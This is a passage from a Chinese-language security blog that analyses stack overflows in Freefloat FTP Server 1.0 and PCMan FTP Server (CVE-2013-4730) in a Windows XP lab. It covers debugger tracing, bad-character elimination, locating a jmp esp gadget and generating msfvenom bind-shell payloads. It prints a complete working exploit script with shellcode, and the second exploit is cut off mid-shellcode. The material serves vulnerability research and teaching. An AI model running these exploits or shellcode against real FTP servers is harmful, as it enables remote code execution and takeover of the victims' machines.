<h4 id="2-4-静态分析结合动态分析"><a href="#2-4-静态分析结合动态分析" class="headerlink" title="2.4 静态分析结合动态分析"></a>2.4 静态分析结合动态分析</h4><p>用IDA加载程序进行静态分析，定位到函数sub_00402DE0</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/16.png?raw=true" style="zoom:80%">

<p>Strcpy函数存在溢出漏洞，将函数第三个参数a3的值复制到局部变量v8中，如果a3过长，会覆盖返回地址，那sub_00402DE0函数的参数a2，a3到底是什么？这就回溯到调用此函数的位置了，通过之前动态分析可以得到调用函数为00402190，IDA静态分析分析得Sub_00402190将输入的字符串与各种ftp命令进行比较，根据命令进行不同的响应。</p>
<p>用immunity debugger回溯到sub_00402190函数里的00402881地址，这个地址的指令跳转执行漏洞函数00402DE0，查看栈帧能够获得参数</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/18.png?raw=true" style="zoom:80%">

<p>在IDA中定位，aXommandNotUnde就是上图的command not understood字符串，此处跳转执行402DE0</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/19.png?raw=true" style="zoom:80%">

<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/20.png?raw=true" style="zoom:80%">

<p>参数1 V16是输入字符串长度，参数2 v17是输入字符串‘AAAA‘:command not understood’ 查看函数栈帧可验证</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/21.png?raw=true" style="zoom:80%">

<p>结论：函数sub_402DE0栈帧结构，（ebp实际不存在，只是方便记录相对偏移）</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/22.png?raw=true" style="zoom:80%">

<p>只需填充0xFC-1个垃圾数据可溢出到函数返回地址（-1是因为程序在输入字符串前添加了单引号），重新组织poc，返回地址为cccc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;192.168.112.146&quot;</span>, <span class="number">21</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*(<span class="number">0xfc</span>-<span class="number">1</span>) + <span class="string">&#x27;cccc&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>返回地址为0x63636363，是cccc的ascii码，验证成功</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/23.png?raw=true" style="zoom:80%">


<h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4. 漏洞利用"></a>4. 漏洞利用</h3><h4 id="1-利用条件"><a href="#1-利用条件" class="headerlink" title="1. 利用条件"></a>1. 利用条件</h4><p>Windows xp sp3未开启DEP保护</p>
<h4 id="2-利用过程"><a href="#2-利用过程" class="headerlink" title="2. 利用过程"></a>2. 利用过程</h4><h5 id="1-排除坏字符"><a href="#1-排除坏字符" class="headerlink" title="1. 排除坏字符"></a>1. 排除坏字符</h5><p>在生成shellcode之前需要确定坏字符，用mona生成一个0x00到0xff的bytearray，发送payload，比对哪个字符发送后会破坏payload，将其排除即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;192.168.112.146&#x27;</span>,<span class="number">21</span>)</span><br><span class="line"><span class="built_in">bytearray</span> = (</span><br><span class="line"><span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f&quot;</span></span><br><span class="line"><span class="string">&quot;\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&quot;</span></span><br><span class="line"><span class="string">&quot;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&quot;</span></span><br><span class="line"><span class="string">&quot;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;</span></span><br><span class="line"><span class="string">&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&quot;</span></span><br><span class="line"><span class="string">&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;</span></span><br><span class="line"><span class="string">&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xfc</span>-<span class="number">1</span>) + <span class="string">&#x27;cccc&#x27;</span> + <span class="built_in">bytearray</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h5 id="2-生成shellcode"><a href="#2-生成shellcode" class="headerlink" title="2. 生成shellcode"></a>2. 生成shellcode</h5><p>利用metasploit生成windows反弹shell的shellcode，排除坏数据’\x00\x0a\x0d’，以c语言格式输出，靶机IP192.168.112.146</p>
<p><code>msfvenom -p windows/shell_bind_tcp LHOSTS=192.168.112.146 LPORT=4444 -b &#39;\x00\x0a\x0d&#39; -f c</code></p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/24.png?raw=true" style="zoom:60%">

<h5 id="3-内存中查找jmp-esp命令"><a href="#3-内存中查找jmp-esp命令" class="headerlink" title="3. 内存中查找jmp esp命令"></a>3. 内存中查找jmp esp命令</h5><p>使用mona插件查询jmp esp指令的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">!mona jmp -r esp</span><br><span class="line"><span class="comment">#或者 </span></span><br><span class="line">!mona find -s <span class="string">&quot;\xff\xe4&quot;</span> -m</span><br></pre></td></tr></table></figure>

<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/25.png?raw=true" style="zoom:80%">

<p>从中选择一个地址0x77D29353，作为跳板，跳转到栈上执行shellcode</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/26.png?raw=true" style="zoom:80%">

<p>最终Exploit.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;192.168.112.146&#x27;</span>,<span class="number">21</span>)</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line"><span class="string">&quot;\xbf\xb9\x9b\xb3\x2f\xdb\xd2\xd9\x74\x24\xf4\x58\x33\xc9\xb1&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x31\x78\x12\x83\xc0\x04\x03\xc1\x95\x51\xda\xcd\x42\x17&quot;</span></span><br><span class="line"><span class="string">&quot;\x25\x2d\x93\x78\xaf\xc8\xa2\xb8\xcb\x99\x95\x08\x9f\xcf\x19&quot;</span></span><br><span class="line"><span class="string">&quot;\xe2\xcd\xfb\xaa\x86\xd9\x0c\x1a\x2c\x3c\x23\x9b\x1d\x7c\x22&quot;</span></span><br><span class="line"><span class="string">&quot;\x1f\x5c\x51\x84\x1e\xaf\xa4\xc5\x67\xd2\x45\x97\x30\x98\xf8&quot;</span></span><br><span class="line"><span class="string">&quot;\x07\x34\xd4\xc0\xac\x06\xf8\x40\x51\xde\xfb\x61\xc4\x54\xa2&quot;</span></span><br><span class="line"><span class="string">&quot;\xa1\xe7\xb9\xde\xeb\xff\xde\xdb\xa2\x74\x14\x97\x34\x5c\x64&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\x9a\xa1\x48\xab\xe2\xe6\x6f\x54\x91\x1e\x8c\xe9\xa2\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\xee\x35\x26\xfd\x49\xbd\x90\xd9\x68\x12\x46\xaa\x67\xdf\x0c&quot;</span></span><br><span class="line"><span class="string">&quot;\xf4\x6b\xde\xc1\x8f\x90\x6b\xe4\x5f\x11\x2f\xc3\x7b\x79\xeb&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\xda\x27\x5a\x92\x3c\x88\x03\x36\x37\x25\x57\x4b\x1a\x22&quot;</span></span><br><span class="line"><span class="string">&quot;\x94\x66\xa4\xb2\xb2\xf1\xd7\x80\x1d\xaa\x7f\xa9\xd6\x74\x78&quot;</span></span><br><span class="line"><span class="string">&quot;\xce\xcc\xc1\x16\x31\xef\x31\x3f\xf6\xbb\x61\x57\xdf\xc3\xe9&quot;</span></span><br><span class="line"><span class="string">&quot;\xa7\xe0\x11\x87\xaf\x47\xca\xba\x52\x37\xba\x7a\xfc\xd0\xd0&quot;</span></span><br><span class="line"><span class="string">&quot;\x74\x23\xc0\xda\x5e\x4c\x69\x27\x61\x63\x36\xae\x87\xe9\xd6&quot;</span></span><br><span class="line"><span class="string">&quot;\xe6\x10\x85\x14\xdd\xa8\x32\x66\x37\x81\xd4\x2f\x51\x16\xdb&quot;</span></span><br><span class="line"><span class="string">&quot;\xaf\x77\x30\x4b\x24\x94\x84\x6a\x3b\xb1\xac\xfb\xac\x4f\x3d&quot;</span></span><br><span class="line"><span class="string">&quot;\x4e\x4c\x4f\x14\x38\xed\xc2\xf3\xb8\x78\xff\xab\xef\x2d\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\xa2\x65\xc0\x68\x1c\x9b\x19\xec\x67\x1f\xc6\xcd\x66\x9e\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x4d\xb0\x55\x72\xc9\xe4\x09\x25\x87\x52\xec\x9f\x69\x0c&quot;</span></span><br><span class="line"><span class="string">&quot;\xa6\x4c\x20\xd8\x3f\xbf\xf3\x9e\x3f\xea\x85\x7e\xf1\x43\xd0&quot;</span></span><br><span class="line"><span class="string">&quot;\x81\x3e\x04\xd4\xfa\x22\xb4\x1b\xd1\xe6\xc4\x51\x7b\x4e\x4d&quot;</span></span><br><span class="line"><span class="string">&quot;\x3c\xee\xd2\x10\xbf\xc5\x11\x2d\x3c\xef\xe9\xca\x5c\x9a\xec&quot;</span></span><br><span class="line"><span class="string">&quot;\x97\xda\x77\x9d\x88\x8e\x77\x32\xa8\x9a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x77d29353 -&gt; jmp esp</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xfc</span>-<span class="number">1</span>) + <span class="string">&quot;\x53\x93\xd2\x77&quot;</span> + <span class="string">&quot;\x90&quot;</span>*<span class="number">16</span> + shellcode</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：shellcode前16个\x90是因为函数返回时的retn 8需要跳过，也可作为滑板，同时作为缓冲区防止执行shellcode时更改内存使得shellcode执行代码也被更改</p>
</blockquote>
<p>执行流程：</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/27.png?raw=true" style="zoom:80%">

<p>栈帧结构：</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/28.png?raw=true" style="zoom:80%">

<p>Shellcode使靶机开放4444端口进行shell连接攻击机，连接成功</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/29.png?raw=true" style="zoom:80%">

<h2 id="四、参考文献"><a href="#四、参考文献" class="headerlink" title="四、参考文献"></a>四、参考文献</h2><ul>
<li><a href="https://www.exploit-db.com/exploits/23243">https://www.exploit-db.com/exploits/23243</a></li>
<li><a href="https://giantbranch.blog.csdn.net/article/details/53291788">https://giantbranch.blog.csdn.net/article/details/53291788</a></li>
<li><a href="https://www.youtube.com/watch?v=i6Br57lh4uE">https://www.youtube.com/watch?v=i6Br57lh4uE</a></li>
<li><a href="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></li>
</ul>
]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>PCMan FTP Server缓冲区溢出CVE-2013-4730漏洞分析</title>
    <url>/2021/04/13/PCMan%20FTP%20Server%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1-漏洞简述"><a href="#1-漏洞简述" class="headerlink" title="1. 漏洞简述"></a>1. 漏洞简述</h3><ul>
<li>漏洞名称：PCMan FTP Server远程缓冲区溢出</li>
<li>漏洞编号：CVE-2013-4730</li>
<li>漏洞类型：缓冲区溢出</li>
<li>漏洞影响：远程代码执行</li>
<li>利用难度：Easy</li>
<li>详细信息：<a href="https://www.exploit-db.com/exploits/26471">https://www.exploit-db.com/exploits/26471</a></li>
</ul>
<span id="more"></span>

<h3 id="2-软件概述"><a href="#2-软件概述" class="headerlink" title="2. 软件概述"></a>2. 软件概述</h3><p>PCMan FTP Server用于打开ftp服务，用于上传文件和管理有线及无线设备的软件</p>
<h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><ul>
<li><p>靶机环境：Windows xp sp3</p>
</li>
<li><p>靶机配置：</p>
<ul>
<li>PCMan FTP Server 2.0.7</li>
<li>windbg</li>
<li>mona</li>
</ul>
</li>
<li><p>攻击机：kali 2.0</p>
</li>
<li><p>攻击机配置：</p>
<ul>
<li>pwntools</li>
<li>metasploit</li>
</ul>
</li>
</ul>
<h3 id="2-复现过程"><a href="#2-复现过程" class="headerlink" title="2. 复现过程"></a>2. 复现过程</h3><p>在靶机中运行PCMan FTP，确保21号端口已打开，用windbg附加程序</p>
<img src="https://i.loli.net/2021/04/12/XVC2LQJKSy8cm6d.png" alt="image-20210412152754291" style="zoom:80%;" />

<p>由漏洞的exploit可以得知USER字段存在溢出漏洞，编写poc并在 kali 中运行测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;192.168.112.146&quot;</span>, <span class="number">21</span>)</span><br><span class="line"><span class="built_in">print</span>(io.recv())</span><br><span class="line"><span class="comment">#使用pwntools的cyclic函数构造唯一子串序列</span></span><br><span class="line">fuzz = flat(<span class="string">&quot;USER &quot;</span>, cyclic(<span class="number">8000</span>))</span><br><span class="line">io.sendline(fuzz)</span><br><span class="line"><span class="built_in">print</span>(io.recv())</span><br></pre></td></tr></table></figure>

<p>windbg查看pcman ftp的运行状态，发现eip指向了0x7561617a非法地址，程序崩溃</p>
<img src="https://i.loli.net/2021/04/12/zwFrnaXVQY2KJfy.png" alt="image-20210412121833539" style="zoom:80%;" />

<p>观察栈帧结构，栈已被poc发送的数据填满，可以确定存在缓冲区溢出漏洞</p>
<img src="https://i.loli.net/2021/04/12/hXoamxe93uRdCZg.png" alt="image-20210412154345854" style="zoom:80%;" />

<h2 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h2><h3 id="1-背景知识"><a href="#1-背景知识" class="headerlink" title="1. 背景知识"></a>1. 背景知识</h3><p>最简单的缓冲区溢出，分析这个漏洞主要熟悉一下用windbg进行栈回溯</p>
<h3 id="2-分析思路"><a href="#2-分析思路" class="headerlink" title="2. 分析思路"></a>2. 分析思路</h3><h4 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h4><p>ftp作为网络通信协议，客户端与浏览器进行交互使用socket，那么一定使用了recv()函数，在windbg中对recv()函数下断点，发送poc并单步跟踪，能够找到漏洞函数</p>
<h4 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h4><p>栈回溯：在触发漏洞的内存地址下断点，触发漏洞时观察栈帧的结构，能够找到漏洞函数的地址。这是本文分析使用的方法</p>
<h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3.详细分析"></a>3.详细分析</h3><p>查看触发栈溢出漏洞时的栈帧结构，那么溢出的数据就不能覆盖函数返回地址，就要确定返回地址的位置：发送poc后，eip指向返回地址0x7561617a</p>
<img src="https://i.loli.net/2021/04/12/zwFrnaXVQY2KJfy.png" alt="image-20210412121833539" style="zoom:80%;" />

<p>在利用pwntools的cyclic_find()函数查看0x7561617a在唯一子串序列中的位置，可以确定返回地址在序列的位置为2000（这也是为什么poc使用cyclic生成字符串的原因）</p>
<img src="https://i.loli.net/2021/04/12/YUSoGd1Q7kwFj5n.png" alt="image-20210412153427473" style="zoom:80%;" />

<p>重新发送poc字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fuzz = flat(<span class="string">&quot;USER &quot;</span>, cyclic(<span class="number">2000</span>), <span class="string">&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/04/12/QAlcxeMfd2Bb5SU.png" alt="image-20210412220844386" style="zoom:80%;" />

<p>此时返回地址已被‘aaaa’覆盖，令进程在覆盖返回地址之前断下，选择栈中返回地址之前设置硬件条件断点，这里我选择0x0012ed98</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ba w4 0x0012ed98 &quot;.if(poi(0x0012ed98)&#x3D;&#x3D;0x74616174)&#123;&#125;.else&#123;gc&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>重新发送poc后进程在0x004173af出断下，kb查看栈信息</p>
<img src="https://i.loli.net/2021/04/12/5cFEm8e241VKCJy.png" alt="image-20210412223430242" style="zoom:80%;" />

<p>栈回溯，利用IDA查看造成缓冲区赋值的函数</p>
<p>0x00417428处函数write_char()，向指针地址写入一个字节的数据，地址赋值不可能只写一个字节，一定有一个函数循环调用write_char()</p>
<img src="https://i.loli.net/2021/04/12/RI2Ged36oXhqrBQ.png" alt="image-20210412224516564" style="zoom:80%;" />

<p>上一层0x00412ced，sprintf函数，继续返回上一层0x00403EE6，即sub_403E60()函数</p>
<img src="https://i.loli.net/2021/04/12/oum8kHi9DdKEIMl.png" alt="image-20210412225953133" style="zoom:80%;" />

<p>这里使用sprintf向Buffer缓冲区赋值</p>
<p>sprintf第二个参数aDDD02d02d05dSS是格式化格式%d/%d/%d [%02d:%02d] (%05d) %s&gt; %s</p>
<p>格式化参数v5是int类型，a2是函数参数char *类型</p>
<p>猜想：是没有控制用户的输入长度，直接将字符串a2复制到局部变量缓冲区buffer导致栈溢出</p>
<p>验证，在.text:00403EE6 E8 D4 ED 00 00    call    _sprintf设置断点，查看参数a2</p>
<img src="https://i.loli.net/2021/04/12/mlCRPki5Z1KAYFj.png" alt="image-20210412231635798" style="zoom:80%;" />

<p>查看0012edc4的值，确定是用户的输入字符串，猜想正确</p>
<img src="https://i.loli.net/2021/04/12/62X5zrygxkol4vH.png" alt="image-20210412231748324" style="zoom:80%;" />

<p>这里格式化获取系统时间，并将数据写入文件，可能是为了记录信息到日志中，查看PCMan ftp的日志文件，更加确认了我们的猜想</p>
<img src="https://i.loli.net/2021/04/13/aOPqI85ilDfhwNg.png" alt="image-20210413001905541" style="zoom:80%;" />

<img src="https://i.loli.net/2021/04/12/8NIA9DRdO6W5igL.png" alt="image-20210412232250828" style="zoom:80%;" />

<h2 id="四、漏洞利用"><a href="#四、漏洞利用" class="headerlink" title="四、漏洞利用"></a>四、漏洞利用</h2><h3 id="1-利用条件"><a href="#1-利用条件" class="headerlink" title="1. 利用条件"></a>1. 利用条件</h3><p>靶机windows xp sp3关闭DEP保护，使栈上的数据可执行</p>
<h3 id="2-利用过程"><a href="#2-利用过程" class="headerlink" title="2. 利用过程"></a>2. 利用过程</h3><h4 id="2-1-排除坏字符"><a href="#2-1-排除坏字符" class="headerlink" title="2.1 排除坏字符"></a>2.1 排除坏字符</h4><p>利用mona插件生成一个0x00到0xff的bytearray，发送payload，比对哪个字符发送后会破坏payload，将其排除即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!py mona bytearray -b &quot;\x00\x0a\0d&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">bytearray</span> = (</span><br><span class="line"><span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22&quot;</span></span><br><span class="line"><span class="string">&quot;\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42&quot;</span></span><br><span class="line"><span class="string">&quot;\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62&quot;</span></span><br><span class="line"><span class="string">&quot;\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2&quot;</span></span><br><span class="line"><span class="string">&quot;\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2&quot;</span></span><br><span class="line"><span class="string">&quot;\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2&quot;</span></span><br><span class="line"><span class="string">&quot;\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;192.168.112.146&quot;</span>, <span class="number">21</span>)</span><br><span class="line"><span class="built_in">print</span>(io.recv())</span><br><span class="line">payload = flat(<span class="string">&quot;USER &quot;</span>, cyclic(<span class="number">2000</span>), <span class="string">&#x27;aaaa&#x27;</span>, <span class="built_in">bytearray</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(io.recv())</span><br></pre></td></tr></table></figure>

<h4 id="2-2-查找jmp-esp命令"><a href="#2-2-查找jmp-esp命令" class="headerlink" title="2.2 查找jmp esp命令"></a>2.2 查找jmp esp命令</h4><p>使进程跳转到栈中执行用jmp esp指令，查询加载模块中jmp esp的地址，机器码 \xff\xe4</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!py mona find -s &quot;\xff\xe4&quot; -m</span><br></pre></td></tr></table></figure>

<p>选择一个拥有可执行权限EXECUTE的地址</p>
<img src="https://i.loli.net/2021/04/12/HC2qzaR5mKwIVuP.png" alt="image-20210412233706727" style="zoom:80%;" />

<h4 id="2-3-生成shellcode"><a href="#2-3-生成shellcode" class="headerlink" title="2.3 生成shellcode"></a>2.3 生成shellcode</h4><p>利用metasploit生成windows反弹shell的shellcode，开放本地端口4444，排除坏数据’\x00\x0a\x0d’，以py格式输出，同时开头由0x20个nop作为滑板</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_bind_tcp LPORT=4444 -b &#x27;\x00\x0a\x0d&#x27;  -n 0x20 -f py</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/04/12/PXGjxtco9FLZk18.png" alt="image-20210412235917719" style="zoom: 80%;" />

<h4 id="2-4-编写exploit"><a href="#2-4-编写exploit" class="headerlink" title="2.4 编写exploit"></a>2.4 编写exploit</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x92\x40\x9f\x93\x91\x93\x41\x49\x4a\x37\x3f\x9b\x93&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x43\x4a\xf9\x4a\x91\x42\x9f\x49\x41\xf8\x9f\xf5\x4a&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x92\xfd\x98\x92\x93\x41\xba\x73\xe1\xfa\x7e\xdb\xdb&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x53\x83\xe8\xfc\x31&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x50\x0e\x03\x23\xef\x18\x8b\x3f\x07\x5e\x74\xbf\xd8&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x3f\xfc\x5a\xe9\x7f\x9a\x2f\x5a\xb0\xe8\x7d\x57\x3b&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xbc\x95\xec\x49\x69\x9a\x45\xe7\x4f\x95\x56\x54\xb3&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xb4\xd4\xa7\xe0\x16\xe4\x67\xf5\x57\x21\x95\xf4\x05&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xfa\xd1\xab\xb9\x8f\xac\x77\x32\xc3\x21\xf0\xa7\x94&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x40\xd1\x76\xae\x1a\xf1\x79\x63\x17\xb8\x61\x60\x12&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x72\x1a\x52\xe8\x85\xca\xaa\x11\x29\x33\x03\xe0\x33&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x74\xa4\x1b\x46\x8c\xd6\xa6\x51\x4b\xa4\x7c\xd7\x4f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x0e\xf6\x4f\xab\xae\xdb\x16\x38\xbc\x90\x5d\x66\xa1&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x27\xb1\x1d\xdd\xac\x34\xf1\x57\xf6\x12\xd5\x3c\xac&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x3b\x4c\x99\x03\x43\x8e\x42\xfb\xe1\xc5\x6f\xe8\x9b&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x84\xe7\xdd\x91\x36\xf8\x49\xa1\x45\xca\xd6\x19\xc1&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x66\x9e\x87\x16\x88\xb5\x70\x88\x77\x36\x81\x81\xb3&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x62\xd1\xb9\x12\x0b\xba\x39\x9a\xde\x57\x31\x3d\xb1&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x45\xbc\xfd\x61\xca\x6e\x96\x6b\xc5\x51\x86\x93\x0f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xfa\x2f\x6e\xb0\x15\xec\xe7\x56\x7f\x1c\xae\xc1\x17&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xde\x95\xd9\x80\x21\xfc\x71\x26\x69\x16\x45\x49\x6a&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x3c\xe1\xdd\xe1\x53\x35\xfc\xf5\x79\x1d\x69\x61\xf7&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xcc\xd8\x13\x08\xc5\x8a\xb0\x9b\x82\x4a\xbe\x87\x1c&quot;</span></span><br><span class="line">buf += <span 